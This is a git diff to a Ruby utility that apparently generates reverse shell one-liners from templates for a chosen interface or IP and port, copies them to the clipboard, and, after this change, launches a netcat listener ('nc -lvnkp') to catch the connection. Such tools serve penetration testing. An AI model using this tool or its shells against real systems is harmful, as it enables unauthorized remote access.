@@ -74,7 +74,7 @@ def help_interfaces(config)
 end
 
 def help_usage()
-  puts "Usage: %s <interface> <port> <binary> <name>" % NAME
+  puts "Usage: %s <interface or IP> <port> <binary> <name>" % NAME
 end
 
 def help(config)
@@ -105,8 +105,8 @@ end
 def main()
   config = JSON.parse(YAML::load(File.open(__dir__ + '/%s.yml' % NAME)).to_json)
 
-  interface, port, binary, name = ARGV[0], ARGV[1], ARGV[2], ARGV[3]
-  if not interface or not port
+  interface_or_ip, port, binary, name = ARGV[0], ARGV[1], ARGV[2], ARGV[3]
+  if not interface_or_ip or not port
     help(config)
     exit
   end
@@ -122,9 +122,18 @@ def main()
   end
 
   # print to stdout and send to clipboard
-  code = gen_shell(config[binary][name], get_interfaces()[interface], port)
+  if interface_or_ip.match(/\A\d/) then
+    code = gen_shell(config[binary][name], interface_or_ip, port)
+  else
+    code = gen_shell(config[binary][name], get_interfaces()[interface_or_ip], port)
+  end
   cmd('xclip -r -selection clipboard', input=code)
   puts code
+  puts "\n(copied to clipboard)\n\n"
+
+  listener = "nc -lvnkp " + port
+  puts("# " + listener)
+  exec(listener)
 end
 
 main
